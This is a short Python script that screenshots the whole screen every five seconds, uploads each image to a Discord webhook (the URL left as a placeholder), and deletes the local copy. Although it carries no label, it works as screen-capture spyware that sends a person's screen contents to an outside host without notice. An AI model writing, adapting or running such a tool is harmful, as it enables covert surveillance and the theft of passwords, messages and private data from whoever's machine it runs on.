import pyautogui, time, discord, aiohttp, asyncio, os
from discord import Webhook
from tempfile import gettempdir

i = 1
url = "webhook here"

async def anything(url, filePath):
    async with aiohttp.ClientSession() as session:
        file = discord.File(filePath, filename=r'temp-'+ str(i) +'.png')
        webhook = Webhook.from_url(url, session=session)
        embed = discord.Embed()
        embed.set_image(url="attachment://"+r'temp-'+ str(i) +'.png')
        await webhook.send(embed=embed, file=file)

while True:

    filePath = gettempdir()+'\\temp-'+ str(i) +'.png' # to make the code more readable although its still bad

    pyautogui.screenshot(filePath)
    print('temp-'+ str(i) +'.png SAVED!.')
    
    loop = asyncio.new_event_loop()
    loop.run_until_complete(anything(url, filePath))
    loop.close()
    
    try:
        os.remove(filePath)
    except OSError as e:
        print(e)
   
    time.sleep(5)
    i = i + 1